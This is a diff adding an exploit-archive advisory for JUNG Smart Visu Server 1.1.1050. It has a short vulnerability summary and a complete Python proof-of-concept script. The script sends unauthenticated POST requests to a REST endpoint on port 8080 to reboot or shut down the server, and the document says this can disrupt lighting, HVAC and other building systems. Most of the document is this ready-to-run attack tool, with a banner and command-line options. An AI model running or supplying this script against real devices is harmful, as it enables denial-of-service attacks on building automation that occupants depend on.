@@ -1,0 +1,87 @@
+=============================================================================================================================================
+| # Title     : JUNG Smart Visu Server 1.1.1050 – Unauthenticated Remote Denial of Service                                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.jung-group.com/en-DE                                                                                            |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/215521/  & 	ZSL-2026-5971
+
+[+] Summary    : A security vulnerability in JUNG Smart Visu Server version 1.1.1050 allows unauthenticated remote attackers to trigger a system reboot or shutdown via a crafted HTTP POST request to a publicly exposed REST API endpoint.
+                 The affected endpoint fails to enforce authentication and authorization controls, permitting direct execution of critical system control commands. 
+				 An attacker with network access to the device (default port 8080) can send a single request to disrupt availability, resulting in a denial of service (DoS).
+                 Successful exploitation may cause service interruption in building automation environments, potentially affecting lighting, HVAC, and other connected control systems.
+[+] POC :
+
+#!/usr/bin/env python3
+
+import requests
+import sys
+import argparse
+
+ENDPOINT = "/rest/items/liteserver_LiteServer_1_systemControl"
+HEADERS = {
+    "User-Agent": "thricer-engine/1.6",
+    "Content-Type": "application/json"
+}
+
+COMMANDS = {
+    "reboot": '{"MSG_ID_TYPE":"MSG_REBOOT_REQ"}',
+    "shutdown": '{"MSG_ID_TYPE":"MSG_HALT_REQ"}'
+}
+
+def exploit(target_ip, command_type):
+    """
+    Sends the malicious request to the target server.
+    """
+    url = f"http://{target_ip}:8080{ENDPOINT}"
+    payload = COMMANDS.get(command_type)
+
+    if not payload:
+        print("[!] Invalid command type. Use 'reboot' or 'shutdown'.")
+        sys.exit(1)
+
+    print(f"[*] Targeting: {url}")
+    print(f"[*] Command: {command_type.upper()}")
+    print("[*] Sending malicious packet...")
+
+    try:
+        response = requests.post(url, headers=HEADERS, data=payload, timeout=5)
+        if response.status_code == 200:
+            print("[+] Request sent successfully!")
+            print("[+] If the device is connected, it should be rebooting/shutting down now.")
+        else:
+            print(f"[?] Unexpected server response: Status Code {response.status_code}")
+            print("[?] The device might already be down or unaffected.")
+
+    except requests.exceptions.ConnectionError:
+        print("[!] Connection to server failed. Ensure it is running and the IP is correct.")
+    except requests.exceptions.Timeout:
+        print("[!] Request timed out. The server might have already been shut down.")
+    except Exception as e:
+        print(f"[!] An unexpected error occurred: {e}")
+
+def banner():
+    print("""
+    ╔══════════════════════════════════════════════════════════╗
+    ║      JUNG Smart Visu Server 1.1.1050 - DoS Exploit       ║
+    ║                       by indoushka                       ║
+    ╚══════════════════════════════════════════════════════════╝
+    """)
+
+if __name__ == "__main__":
+    banner()
+    parser = argparse.ArgumentParser(description="DoS exploit for JUNG Smart Visu Server.")
+    parser.add_argument("target", help="The target server IP address (e.g., 192.168.1.100)")
+    parser.add_argument("action", choices=["reboot", "shutdown"], 
+                        help="The action to perform: 'reboot' to restart, 'shutdown' to stop.")
+    
+    args = parser.parse_args()
+    
+    exploit(args.target, args.action)
+	
+	
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
